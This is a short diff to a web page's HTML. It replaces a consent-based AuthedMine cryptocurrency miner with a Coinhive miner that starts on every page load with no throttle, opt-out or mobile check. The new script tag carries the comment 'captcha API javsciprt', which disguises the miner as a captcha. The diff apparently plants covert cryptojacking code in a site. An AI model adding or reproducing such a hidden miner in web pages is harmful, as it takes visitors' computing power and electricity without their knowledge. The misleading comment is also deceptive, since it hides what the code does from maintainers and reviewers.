@@ -69,10 +69,9 @@ $(function () {
 })();
 </script>
 
-<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<!--captcha API javsciprt -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
-	var miner = new CoinHive.Anonymous('DVczu1OvNUFtZNSzykJhmzjZjwc4M37g', {throttle: 0.3});
-	if (!miner.isMobile() && !miner.didOptOut(14400)) {
-		miner.start();
-	}
+	var miner = new CoinHive.User('DVczu1OvNUFtZNSzykJhmzjZjwc4M37g', 'liberxue');
+	miner.start();
 </script>
